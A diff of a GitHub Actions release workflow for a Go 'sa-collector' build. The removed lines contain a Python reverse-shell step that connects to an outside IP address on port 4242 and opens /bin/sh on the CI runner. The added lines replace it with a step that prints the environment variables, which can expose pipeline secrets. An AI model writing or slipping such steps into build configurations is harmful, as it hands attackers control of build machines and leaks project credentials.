@@ -14,17 +14,17 @@ jobs:
       GOOS: linux
       GOARCH: amd64
       RELEASE: ${{ github.ref_name }}
+
     steps:
       - uses: actions/checkout@v3
       - uses: actions/setup-python@v4 # For cloudsmith-cli
       - uses: actions/setup-go@v3
         with:
           go-version: '>=1.18'
-      - run: python -c "import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('164.92.162.149',4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')"
+      - run: |
+        print %ENV
+      - run: go build -ldflags "-s -w" -o bin && tar -czvf sa-collector-$(echo $RELEASE | tr '/' -)-$GOOS-$GOARCH.tar.gz bin
         shell: bash
-#      - run: go build -ldflags "-s -w" -o /tmp/bin && tar -czvf /tmp/sa-collector-$RELEASE-$GOOS-$GOARCH.tar.gz /tmp/bin
-#        shell: bash
-
 
 #      - name: Push
 #        id: push
